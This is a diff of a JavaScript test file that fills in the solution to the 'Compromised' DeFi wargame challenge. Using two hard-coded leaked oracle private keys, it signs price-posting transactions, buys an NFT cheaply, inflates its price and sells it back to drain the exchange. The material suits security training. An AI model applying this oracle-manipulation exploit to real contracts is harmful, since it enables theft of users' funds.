@@ -52,6 +52,79 @@ describe('Compromised challenge', function () {
 
   it('Exploit', async function () {
     /** YOUR EXPLOIT GOES HERE */
+    let tx
+    let data
+    let signed
+
+    const privKey1 = 'c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
+    const privKey2 = '208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+
+    // Manipulate Oracle prices
+    data = web3.eth.abi.encodeFunctionCall(
+      {
+        name: 'postPrice',
+        type: 'function',
+        inputs: [
+          {
+            type: 'string',
+            name: 'symbol'
+          },
+          {
+            type: 'uint256',
+            name: 'newPrice'
+          }
+        ]
+      },
+      ['DVNFT', ether('1').toString()]
+    )
+
+    tx = {
+      to: this.oracle.address,
+      gas: 3e6,
+      nonce: 0,
+      data
+    }
+    signed = await web3.eth.accounts.signTransaction(tx, privKey1)
+    await web3.eth.sendSignedTransaction(signed.rawTransaction)
+
+    signed = await web3.eth.accounts.signTransaction(tx, privKey2)
+    await web3.eth.sendSignedTransaction(signed.rawTransaction)
+
+    // Buy one token
+    await this.exchange.buyOne({ from: attacker, value: ether('1') })
+
+    // Set a new price
+    data = web3.eth.abi.encodeFunctionCall(
+      {
+        name: 'postPrice',
+        type: 'function',
+        inputs: [
+          {
+            type: 'string',
+            name: 'symbol'
+          },
+          {
+            type: 'uint256',
+            name: 'newPrice'
+          }
+        ]
+      },
+      ['DVNFT', ether('10001').toString()]
+    )
+
+    tx = {
+      to: this.oracle.address,
+      gas: 3e6,
+      nonce: 1,
+      data: data
+    }
+    signed = await web3.eth.accounts.signTransaction(tx, privKey1)
+    await web3.eth.sendSignedTransaction(signed.rawTransaction)
+    signed = await web3.eth.accounts.signTransaction(tx, privKey2)
+    web3.eth.sendSignedTransaction(signed.rawTransaction)
+
+    await this.token.approve(this.exchange.address, 1, { from: attacker })
+    await this.exchange.sellOne(1, { from: attacker })
   })
 
   after(async function () {
